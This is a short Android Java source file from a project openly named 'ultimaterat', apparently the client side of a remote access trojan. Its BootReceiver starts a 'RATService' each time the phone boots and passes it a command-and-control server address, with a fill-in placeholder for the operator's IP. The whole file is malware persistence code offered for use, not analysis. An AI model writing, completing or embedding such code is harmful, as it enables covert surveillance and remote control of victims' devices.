package com.ultimaterat.client;

import android.content.*;
import android.os.*;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            Intent serviceIntent = new Intent(context, RATService.class);
            serviceIntent.putExtra("c2_server", "http://YOUR_SERVER_IP:3000");
            context.startService(serviceIntent);
        }
    }
}